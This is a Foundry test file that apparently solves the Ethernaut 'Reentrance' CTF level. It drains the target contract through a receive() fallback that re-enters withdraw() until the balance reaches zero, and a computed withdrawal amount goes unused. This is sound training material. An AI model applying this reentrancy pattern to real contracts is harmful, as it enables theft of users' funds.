// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_10/Reentrance.sol";

contract ReentranceTest is Test {
    Reentrance reentrance;
    address alice;
    address bob;
    uint256 initialDeposit = 1 ether;

    function setUp() public {
        alice = vm.addr(1);
        bob = vm.addr(2);

        reentrance = new Reentrance();
    }

    function testAttack() public {
        vm.deal(alice, 4 ether);
        vm.startPrank(alice);
        reentrance.donate{value: 2 ether}(bob);
        vm.stopPrank();

        vm.prank(alice);
        reentrance.donate{value: initialDeposit}(address(this));

        withdraw();

        assertEq(address(reentrance).balance, 0);
    }

    function withdraw() public {
        if (address(reentrance).balance > 0) {
            uint256 toWithdraw =
                initialDeposit < address(reentrance).balance ? initialDeposit : address(reentrance).balance;
            reentrance.withdraw(initialDeposit);
        }
    }

    receive() external payable {
        withdraw();
    }
}
